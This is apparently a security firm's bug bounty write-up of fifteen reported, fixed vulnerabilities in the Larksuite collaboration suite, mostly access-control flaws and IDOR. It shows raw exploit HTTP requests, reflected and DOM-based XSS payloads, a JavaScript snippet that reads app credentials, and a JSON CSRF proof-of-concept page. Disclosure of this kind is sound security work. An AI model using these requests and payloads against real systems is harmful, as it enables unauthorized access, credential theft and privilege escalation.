---
layout: post
title:  "We Hacked Larksuite For 1 month and Here is what we found" 
author: snapsec
categories: [ article,broken-access-control ]
image: assets/images/lark/main/LarkSuite.png
---



Almost a year back in March 2020 shuffling our private invites stock to crash into a program worthy of our time and excitement. In a while, we stumbled upon a program by name of **Lark Technologies**. Larksuite is a _collaborrative platform_ where users can collaborate on various tasks. This *product comprised of various interconnected services and functionalities* and hence the name _suite_. The stats on the bugbounty page spoke that they were *responsive and unselfish* with their bounties. All this was interesting and solidified the notion of choosing *larksuite* as our next target for some time to hack on. Choosing a *programme/target only on the above apparent things* can't be an intelligent step one should take. So, we started exploring the *target* and we found enough reasons to deem it as our next target, as an example:

- __Bigger application size of Larksuite__: This in simple terms means a **larger attack surface**, _more depth_ and *less burnouts*. With respect to the above *program* it provided various services like _messenger, meetings, calendars, email services, docs, and cloud storage_ .

- __Complicated Access controls were implemented__ : This is something we can hardly resist from testing, being specialized in *testing access controls* this was one of our strongest cues. Larksuite implemented various **RBAC (Role-based access controls)**  in the application meaning there were exclusive *permission sets* for specific roles in the *organization*.

- __File management and sharing systems__ :  One of the *fun and interesting* feature to exploit and fiddle with. Larksuite *implemented file sharing systems* in their product as well which allowed users to **upload and share various files and documents** and they could also *edit/create new versions of those files*.

These were some of the principal points on basis of which we were very excited to dive deep into different products offered by larksuite.

# Recon

The rule of thumb when it comes to hacking any target is to know it well and collect as much as information as you can.


> If you give a hacker a new toy, the first thing he’ll do is take it apart to figure out how it works. — Jamie Zawinski


Reconnaissance is a set of processes and techniques used to covertly discover and collect information about a target system. In the reconnaissance stage, attackers act like detectives, gathering information to truly understand their target. If you think *Recon is only* the process of running a set of tools blindly while watching the *flashing colors*  with your arms *crossed*, then you need to rethink the *process of recon*. Or you are going to know a different kind of recon in this section.

Prior to running tools and gathering data our recon comprises of **Reading product documentation, checking their youtube channels, third-party product walkthroughs and tutorials. webinars etc**. We will be briefly describing the mentioned approaches in our *Recon process*.

-  __Reading Product documentation__: These are one of the accurate and simplified resources you can get your hands on. They are built or documented for the users/customers of this application and they've simplified it to the level that anyone can understand it. The perks of reading this documentation are that *you get to understand* the application from a *user's perspective* and all of the *features get revealed to you*, their use and dependence. Moreover, the logic of the application gets clear to you. We spent a few days reading the documentation and using the application as *simple users* and meanwhile, if any test case came to our mind we just noted it down. 

- __Browsing their youtube channels__ :  In this case, we *visited the official channel of larksuite*  which is under the name of *Lark* on youtube, there was again a treasure of information. Step-by-step tutorials explaining difficult features, in other words, it is a visual documentation of the product. We went through almost all of the Videos thoroughly and it sedimented the *understanding of product* and we were able to understand it better.



    > Lark youtube Channel : [https://www.youtube.com/c/Larksuite/videos](https://www.youtube.com/c/Larksuite/videos)



- __Reading about the product from third party resources__ : One of the prime benefits of reading from *third party resources* the *product information and one's user knowledge* get diversified and sometimes you can *know the issues or errors* from those resources which can be *directly abused* and you can have easy bugs.

- __Product helpdesk and community support__: People have always listed their typical queries and concerns on these platforms and the companies have answered them. We read the queries as well so that we can grasp some typical issues faced by maximum users and look into them if they can be abused.

During the process we came to know that larksuite has 4 different main products:

- __Messenger:__ Is an integrated Messenger which allows team members to chat, Send files, and more anywhere within the larksuite.
- __Calendars:__ Connected Calendars are used to Schedule Meetings, Keep track of Events, and more. (Imagine this of a google calendar).
- __Docs:__ Is a file sharing service, It allows team members to upload, Edit, Create, Delete, Version Track, and Share files with other members.
- __Video Conferencing:__ Is a service that allows team members to perform video/audio group calls with other team members.

and all of these products had tons and tons of features for us to test.

Surely our recon doesn't end here but this forms the *fundamentals* of our recon to any *organization or target* we choose to hack. 


## Vulnerabilities Discovered

Although we cannot write and publish about every vulnerability we found, but here are some of the most interesting/Fixed ones.


> ⚠️ Please note that all these security issues were resolved and fixed by Lark team.

|ID | Title |  
|---|---|
|1|Accessing/Editing Folders of Other Users in the Orginisation       | 
|2|Stealing app credentials by reflected xss on Lark Suite |  
|3|Privilege Escalation to All-staff group (editing/accessing/deleting All-staff group)       |  
|4|IDOR - Access to private Tickets of helpdesk. |  
|5|Viewer is able to leak the previous versions of the file      |  
|6|User without permission can download file's even if it's restricted.       |  
|7|DOM based open redirect leads to XSS on larksuite.com using /?back_uri= parameter |  
|8|IDOR allows viewer to delete bin's files of Admin       | 
|9|Access to private file's of other users in helpdesk conversation |  
|10|Sub-Dept User Can Add User's To Main Department | 
|11|Auto approving own apps from a lower level role leading to mass privilege escalations |  
|12|Attacker can join any tenant on larksuite and view personal files/chats. |  
|13|No Csrf protection against sending invitation to join the team. | 
|14|Low privileged user is abel to access the Admin log |  
|15|Viewing comments on files and documents. |  


<br><br>



#### Accessing and Editing other users folders in the organization

We Started with their access control model which included tons of permission on each level and just after spending a few hours we found that Lark-suite allows highest privileged user(Primary administrator) to invite other admin's/users. The invited users are allowed to view/modify their folders in the lark app. But we found a security issue that could have allowed other users to view/modify the directory structure of other users in the organization, without having any access on those files.

![1](/blog/assets/images/lark/1/1.png)


Once the *highest privileged user(Primary administrator)* added another user he was only able to *access the company information* but he lacked access on the *files and directories* of other members. On digging a bit we found a *GET Request* which takes user id in a parameter and *returns the directories and tokens of that user* in the response.

```http
GET  /suite/admin/space_manage/user_folder?userID=6782777787976515850  HTTP/1.1
Host: unzftv7n88.larksuite.com
Connection: close
X-Timezone-Offset: 600
X-Csrf-Token: [Value]
credentials: same-origin
Cache-Control: no-cache
Cookie:[Value]
```

![1](/blog/assets/images/lark/1/2.png)

On the above request we appended another token in the *parameter query* and added a *parentToken* and we gave its *value* as the _user's folder token_ we got in the response of the above request. Request looks something like this:

```http
GET  /suite/admin/space_manage/user_folder?userID=[UserId]&parentToken=[PToken]  HTTP/1.1
Host: unzftv7n88.larksuite.com
Connection: close
X-Timezone-Offset: 600
X-Csrf-Token: [Value]
credentials: same-origin
Cache-Control: no-cache
Cookie:[Value]
```
The response of this request returned us all of the *files* inside that parent directory as well as the unique `token` of each file inside that directory, these Tokens could be later used to download the whole file using this endpoint `https://internal-api-space.larksuite.com/space/api/box/stream/download/all/[token]/` 


![1](/blog/assets/images/lark/1/3.png)

Moving a step further, we tried if we can *create new files* inside that *folder* and enquiring a bit we found a *below http request* was used to create new folders in a *directory*

```http
POST  /suite/admin/space_manage/user_folder  HTTP/1.1
Host: unzftv7n88.larksuite.com
Connection: close
X-Timezone-Offset: 600
X-Csrf-Token: [Value]
credentials: same-origin
Cache-Control: no-cache
Cookie:[Value]
```
We used the *leaking directory tokens* in this request and the response was **200 ok** and upon confirmation, we found *new sub directory* was created in that folder.

![1](/blog/assets/images/lark/1/4.png)


---


#### Stealing App Credentials Using Reflected XSS On LarkSuite

A reflected cross-site scripting (XSS) vulnerability was found on a Lark Suite endpoint via the 'next' parameter which an attacker could potentially use to obtain app credentials (must first know the app ID) of any larksuite user.

Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. Such was the case here on this following endpoint `https://open.larksuite.com/officialapp/cli_9c4cd0ee44b81106/url/callback?next=<script>alert('snapsec')</script>`, The callback parameter was being reflected in the context of `open.larksuite.com` and hence could have allowed us to perform an XSS attack.

As far as our understanding of lark applications, `open.larksuite.com` was a pretty interesting target. We couldn't perform any direct impact of the user account since there are very limited endpoints and functionalities hosted under `open.larksuite.com`, One of the features that caught our attention was the `Application`.

In larksuite while creating an app, an admin can provide a set of Permission to the App which would allow the app to have access to Lark Teams, Chats, Files, and much more and we decided to prove its impact by stealing the application credentials of a victim which could be used for further privilege escalation. 



To do that we wrote the quick Javascript function, Which extracts user information from the Larksuite app, and hence could have allowed us to extract the following information about the apps:


- app_access_token
- app_access_token
- tenant_access_token
- tenant_access_token
- and more...


```js
function AppGrabber()
{
var xhr = new XMLHttpRequest();
xhr.open("GET", "https:\/\/open.larksuite.com\/api\/v3\/app/\cli_9eb747e4557e9106", true);
xhr.setRequestHeader("Accept", "application\/json");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
xhr.setRequestHeader("content-type", "application\/json; charset=utf-8");
xhr.withCredentials = true;
xhr.send('{"Body":{},"Head":{}}');
xhr.onreadystatechange = function() {
if (xhr.readyState === 4) {
alert(xhr.response);
}
}
}

```


> The extracted information could later be used to extract more information about the target orginisation.


---
#### Privilege escalation from only view company info to adding and removing staff members.


In this case, Lark-suite allowed admins to invite other admins with specific permissions. There was a *specific permission set* which comprised of various permissions and among them, the admin can specify the *permissions with which he wants users on board*.

In this case *we added a user with only* view company information as shown in this image.

![1](/blog/assets/images/lark/2/1.png)

We gave the new user this(company info) permission and restricted him from other permissions available, which means he should not be able to access other but we managed to figure out that an invited admin with limited privileges can still Edit/Access/Delete All-staff group in the organization.

We sent this `HTTP` request and returned us the *data of the* all of the groups and *an unauthorized user was able to access All staff groups' information*.

```http
GET  /suite/admin/tenant/chatSetting  HTTP/1.1
Host: unzftv7n88.larksuite.com
Connection: close
X-Csrf-Token: [Value]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
credentials: same-origin
Content-Type: application/json;charset=UTF-8
Cookie: [Value]
```
Spending time with this *unusual behavior* we found a few more *issues* with this feature. As an unprivileged user we were able to escalate our *privileges* and we identified various issues which are as *under*:

- Creating new staff groups in the organization using this HTTP request


```http
POST /suite/admin/tenant/chat HTTP/1.1
Host: unzftv7n88.larksuite.com
Connection: close
X-Csrf-Token: [Value]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
credentials: same-origin
Content-Type: application/json;charset=UTF-8
Cookie: [Value]

{"employeeTypes":[1,2,3,4,5],"chatName":"imranparrayx"}
```

- Editing settings of various staff groups of Admin

```http
PATCH /suite/admin/tenant/chat HTTP/1.1
Host: unzftv7n88.larksuite.com
Connection: close
X-Csrf-Token: [Value]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
credentials: same-origin
Content-Type: application/json;charset=UTF-8
Cookie: [Value]

{"employeeTypes":[1,2,4,5],"ownerID":"6782777787976515850","chatName":"Admins-Group"}
```

- Deleting/Disabling staff group

```http
POST /suite/admin/tenant/dissolve_chat HTTP/1.1
Host: unzftv7n88.larksuite.com
Connection: close
X-Csrf-Token: [Value]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
credentials: same-origin
Content-Type: application/json;charset=UTF-8
Cookie: [Value]
```

- Re Enabling All Staff Group


```http
POST /suite/admin/tenant/normalize_chat HTTP/1.1
Host: unzftv7n88.larksuite.com
Connection: close
X-Csrf-Token: [Value]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
credentials: same-origin
Content-Type: application/json;charset=UTF-8
Cookie: [Value]
```



In general, an unprivileged user was able to manage a staff department without having access to it. 




---

### [IDOR] - Access to anyone's ticket's of helpdesk 

![1](/blog/assets/images/lark/rest/xxx2.png)


In enterprise collaboration, employees often have questions and don't know who to ask. Even they make lot of efforts and find someone who can answer the questions, they may not receive replies in time. To avoid such process, larksuite had a feature called designed called HelpDesk.

Any department or individual in the enterprise can create and use Help Desk, and set auto Q&As regarding their business. When employees have a question, they can quickly find the corresponding Help Desk by searching the question type, and the intelligent customer service will answer immediately. If the intelligent customer service can not resolve the employee's questions, Help Desk will quickly call the corresponding agents to answer it. We found that this paticular functionality was vulnerable to an IDOR attack.


```http
GET /saipan/v2/api/worksheet/get?worksheet_id=[target-id] HTTP/1.1
Host: subdomain.larksuite.com 
Connection: close Content-Length: 29 

```

to execute the attack all we had to do is change the `worksheet_id` to the victims `worksheet_id` and we were able to access the tickets and personal information of other users on Larksuite.



---

#### Viewer is able to download previous versions of a file

As mentioned earlier *larksuite allows* users to share *files with others* . A file can have *multiple versions* and from documentation, we *remember that previous versions should not be accessible* to the *viewers* of the file. But in this case, we abused that *functionality and were able to download the previous versions of the files* as viewers. 

While *browsing* a file as a user and at the same time analyzing the requests via burp we *saw an* `HTTP` request which leaked the *current version id* of the *file* including the *previous versions ids of file*.

![1](/blog/assets/images/lark/3/2.PNG)


We also found another `http` POST request and in its body we *posted* the leaked *previous version id* and in the *response* it gave us various details of the *previous version* along with the *download url of that file*.

Request is as below:

```http
POST  /space/api/box/file/info/  HTTP/1.1
Host: internal-api-space.larksuite.com
x-command: space.api.box.file.info
Content-Type: application/json


{"version":"leaked_versionid","caller":"explorer","file_token":"ofcurrentfile","option_params":["preview_meta"]}
```


![1](/blog/assets/images/lark/3/1.PNG)


Browsing this *url in browser* we were able to download all of the *previosu versions* of the file.

---



















#### User without permission can download file's even if it's restricted.

In the previous issue, we mentioned that larksuite allowed users to *share files* and the *file access* was controlled by certain *permissions* which only *Admins of the file* can set.

In this case *we shared our file* with a user and *restricted the download permissions* , implying that the user with whom the file is being shared will be unable to download (as seen download button is disabled) the *file* but can *only view it*.

![1](/blog/assets/images/lark/4/1.png)

We were able to bypass this restriction simply by *sending this http request*:
```http
GET  /space/api/box/stream/download/all/[file-id]/  HTTP/1.1
Host: internal-api-space.larksuite.com
x-command: space.api.box.file.info
Content-Type: application/json
``` 

In the response of this request we got the *downlaod url of the file* and pasting this *url in the browser* , we were simply able to downlaod the *file irrespective of the permissions*.

Download URL will look something like this:

Url will look like `https://internal-api-space.larksuite.com/space/api/box/stream/download/all/[file-id]/`


---


#### DOM based open redirect leads to XSS on larksuite.com using /?back_uri= parameter

DOM-based open redirection arises when a script writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain

The interesting thing about the DOM based open redirection is that if an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser. For example


![1](/blog/assets/images/lark/rest/xxx1.png)



What we found in this issue is that "back_uri" parameter was vulnerable to DOM based Open Redirection, The logic behind this issue was very simple, When the user visited the following link `https://www.larksuite.com/create/?back_uri=javascript:alert(document.cookie)`, A `Go Back` Button was Displayed on his screen and the button was calling a JS function which was updating the `document.location.href` of the current page to the value set to the /?back_uri= parameter. 

Hence passing `javascript:alert('snapsec')` would have allowed attacker to escalate this Open redirection into an DOM based XSS.



---

#### Viewer was able to permanentaly delete bin files of Admin

This issue was also found in file systems of *larksuite*. In this case, we were able to *permanently delete* files from the trashbin of *Admin*. Trash and permanent delete functions seemed to be *interesting* that too when access controls are administered.

The *Admin* invited a user in his personal *directory*  with only *view permissions* and he *couldn't delete or edit the files* in that directory.  The shared *folder* contained many *files and sub-folders*  and the *viewer could not delete or edit them*. Admin deleted the *shared folder* and this *folder along with its files* is moved into the **trash bin of admin** and the viewer has no access on it.

Logically *viewers access from that folder* should be removed when it is *moved into the admins trash bin*, but we noticed that *viewer was still able to get the files inside that folder*, via a `GET` request which materialized the thought that *viewer still has access* on the *folder*. We tried to *perform other restricted* operations by sending *various http requests* but *no luck with that*. Then we *noticed that* there is a *delete permanent* feature available *in the trash* we tried to twitch this. 

![1](/blog/assets/images/lark/5/1.PNG)


HTTP request we *analyzed* that was responsible for *deleting permanentaly* a *folder looked something* like this:

```http
POST /space/api/explorer/trash/delete/ HTTP/1.1
Host: internal-api-space.larksuite.com
Accept: application/json, text/plain, */*
Context: request_id=jgjIhvCWfQu6-6905236920255643653;os=windows;app_version=1.0.3.3484;os_version=10;platform=web
X-CSRFToken: d08f9dadd19d65cd1e913b0e7e62d2aa0b6a9775-1609669174
F-Version: docs-12-30-1609316079670
Origin: https://q5b6qhp5uw.larksuite.com
Referer: https://q5b6qhp5uw.larksuite.com/
Cookie: [Value]

token=123456
```

We sent this request as a viewer and using the *folder id*  of the *admin folder* , we got **200 ok** and upon confirmation, the *folder was permanently deleted* from **Admins trash**.


---


#### Access to private file's of other users in helpdesk conversation.

Remember previously we mentioned helpdesk is a golden nugget of information in every stance and this time we were able to access the *private files* used in conversation with the *larksuite staff*.

The conversations are meant to be *private* not public and *hence every message and file* was confidential. Larkhelpdesk was simply a _support portal_ which we hope you have crossed anywhere.

The clicking factor here was that we identified that they were saving the *files* on the same domain of which *one member created a ticket*, a *file url* looked something like this:

`https://name.larksuite.com/saipan/v2/api/ticket/image?ticket_id=26678` 

Since *created ticket ids*  were viewable by the *other teammates* and they can just copy the *file url* and paste it in their *browser* and *put in the random file id*, in a link if that file exists they were able to view that file. Even though it was private and not accessible by other users.


---


#### Sub-Dept User Can Add User's To Main Department

In larksuite an owner of the tenant can create sub-department's for convenience and user management. It can only be done by the owner of the tenant. If a user is *added in a subdepartment* he can only access that department and *he won't be able to access* other departments of the organization or add *new users* in them.

When adding a user in a sub-department we observed the http request and it looks like this:

```http
POST /suite/admin/employees/ HTTP/1.1
Host: hackeron1.larksuite.com 
Connection: close 
Content-Length: 149 

{"mobile":"","customFields":{"C-6826729584252157957":""},"name":"test","departments":["department_id"],"email":"ooo@gmail.com","joinTime":"","isInvite":true}
```

With this *request the sub-department* group member can add the *member only in this sub department* but intercepting this *request* and *sending* **departments** key with an empty value, we noticed that we got **200 ok** response and the new user was added in the main organization by a low privileged member.


---


#### Auto approving own apps from a lower level role leading to mass privilege escalations

Larksuite allowed users with *specific permissions* to be invited in the team and one of such permissions was **App management**. In this case we abused this permission to *auto approve our own app*.

Admins can add a user with *App management permission* on a specific *app* and once the *users create* an app, they will have to *submit it to admin* who will approve the *application*. After approval from the admin, that application wil be functional and the *api token* will get validated. 

![1](/blog/assets/images/lark/rest/3.png)


Since we know user couldn't approve an app by himslef so noticed a request *that was responsible for approving the application*, it looked something like this:

```http
PUT /suite/admin/appcenter/app/[App-id]/auditWhiteList HTTP/1.1
Host: larksuite1.larksuite.com 
Connection: close Content-Length: 29 

{"audit_white_list_status":1}
```

Sending this request from the *low privileged user* the response was **200 OK** and the app got approved by the attacker. Once the *app was auto-approved*  the user can now use this *fully functional app*, he can add new members in this, he can also delete departments via this app.

For example, let's say an attacker has permissions of App management only he will create an app with update permission and afterward will approve this app himself(Bypassing check from admin), he will then use the token in api call's to update any user's contact information. Similarly numerous permissions can be attached with the app afterward as he will accept the given app himself and gets a token that will be used to make almost any API call's and Update any information. Which will give him access to all the features where the only admin was allowed hence leads to mass privilege escalation.


---

#### Attacker can join any tenant on larksuite and view personal files/chats.

We stepped on a new feature on one of the domains of larksuite  which is known as __Test companies and user's__. This feature was basically introduced so that lark user's can create sandbox tenants where they can test their app's in a whole different environment but by bringing new feature we mean bringing new vulnerabilities this feature can be abused in such a way that user's can get access to other user's tenant without any interaction. The lark *admins or tenant admins* can add new memebers *in these tenants* for different testing *puproses*.

An invitation request in a *tenant* when analyzed was as follows:

```http
POST /sandbox/AddTestTenantMember HTTP/1.1
Host: open.larksuite.com 
Cookie: Content-Length: 73 
X-Csrf-Token: XYZ

{"TestTenantID":"TENANT_ID","Email":"EMAIL"}
```

Attacker *simply changed* the _TestTenantID_ value (which was a random numeric id and forwarded the request and response was **200 ok**. The used email id was mailed that he has been invited in a tenant of someone else. 

Inside that *tenant attacker can access* the files, conversations and other sensitive information. Plus i also noticed that Larksuite internally uses the same platform in order to host their files for example on **App.larksuite.com** we have various app's and their documentation is hosted on the larksuite itself if an attacker will join the team it means that the attacker would be able to get access to those official documentation, Chats and other teams belong to the Larksuite company.


---




#### [CSRF] No Csrf protection against sending invitation to join the team.

We found a possible way through which anyone can perform a CSRF Attack and forge a request from the admin's browser to join the team, as the request doesn't consist any sort of CSRF protection. 

The following request was used to Invite a new member to the Team and was vulnerable to a CSRF Attack

```http
POST /create/api/v2/invite HTTP/1.1
Host: www.larksuite.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

{"mobiles":[],"emails":["imunissar786@gmail.com"]}
```


So we created a Quick POC to exploit the issue

```html
<html>
<title>JSON CSRF POC</title>
<body>
<center>
<h1> JSON CSRF POC </h1>
<script>
fetch('https://www.larksuite.com/create/api/v2/invite', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"mobiles":[],"emails":["attacker@gmail.com"]}'});
</script>
<form action="#">
<input type="button" value="Submit" />
</form>
</center>
</body>
</html>
```


So as soon as someone from the team who has access to Invite Team members functionality visited our poc.html, He would invite Us(attacker) to their organisation on larksuite.


---
#### Low privileged user is able to access the Admin log

In this issue, we managed to figure our that when permission named as **internal risk control** is assigned to any user he is able to view all the admin logs of the company, Which shouldn't be the case generally, So we decided to dig the further and later on found it was a security issue.

![1](/blog/assets/images/lark/rest/2.png)


Admin logs contain all the sensitive information like recent changes made, Permission changes,  View newly added or removed users, and View newly created files and deleted files. It keeps a record of all the recent activities in the organization. We found a user *without the above-mentioned permission* was able to *access the company logs* via broken authentication on mentioned API endpoint.

The restriction was only *implemented on the UI but not on the API request*, sending that request we were able to *fetch all logs of the organization* in burpsuite. The `HTTP` request was as follows:

```http
GET /suite/admin/logs/?count=30&offset=0&min_time=1586025000&max_time=1649356199&_t=1649312050201 HTTP/1.0
Host: Subdomain.larksuite.com
X-Csrf-Token: XYZ
Cookie:[Value]

```


---

####  Viewing comments on files and documents.

Lark file systems let users to share files and documents and collaborate on them. The collaborators on a file can post comments on the file as well. But the *unauthorized users* or the users with whom the *file is shared* via an external link can *only view the file and not post or view comments on it*. This is becasue they are external users on the *file/document* and not collaborators.

Analyzing the *comment request* of a file, we found a **GET request**  returned us all comments in the response. The request was as follows:
`/space/api/message/get_message.v3/`. We tried to send this request from an *unauthorized role* and we got **403**.

 In an instance we changed the *v3 to v2* and we got all of the comments of the *file in a response*. This is how *another version of api* leaked the comments to the attacker.




---

That's all for now and If you have any questions, suggestions or requests, Please contact us on Twitter([@snap_sec](https://twitter.com/snap_sec))
See you next time.







#### About us

Snapsec is a team of security experts specialized in providing pentesting and other security services to secure your online assets. We have a specialized testing methodology that ensures in-depth testing of your business logic and other latest vulnerabilities. 

 If you are looking for a team that values your security and ensures that you are fully secure against online security threats, feel free to get in touch with us #[support@snapsec.co](mailto:support@snapsec.co)
 
 
